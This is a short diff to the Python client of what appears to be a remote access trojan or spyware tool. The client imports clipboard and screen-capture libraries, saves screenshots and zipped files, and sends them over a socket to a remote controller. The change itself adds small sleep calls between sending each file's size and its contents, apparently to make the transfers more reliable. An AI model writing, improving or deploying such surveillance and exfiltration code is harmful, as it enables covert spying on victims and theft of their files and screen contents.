@@ -15,6 +15,7 @@ import ctypes
 import platform
 import threading
 import pyperclip
+import time
 
 from mss import mss
 from zipfile import ZipFile
@@ -82,6 +83,7 @@ class Client:
         picsize = os.path.getsize('./logs/screen{}.png'.format(self.screenshot_counter))
         size = str(picsize)
         self.client.send(size.encode("utf-8")) # sending size
+        time.sleep(0.1)
 
         screen = open('./logs/screen{}.png'.format(self.screenshot_counter), 'rb')
         tosend = screen.read()
@@ -145,6 +147,7 @@ class Client:
         # send size
         arcsize = os.path.getsize(archname)
         self.client.send(str(arcsize).encode("utf-8"))
+        time.sleep(0.1)
 
         # send archive
         with open('./logs/files.zip', 'rb') as to_send:
@@ -203,6 +206,7 @@ class Client:
 
             archive.close()
             self.client.send("[OK]".encode("utf-8"))
+            time.sleep(0.1)
 
             # send size
             arcsize = os.path.getsize(archname)
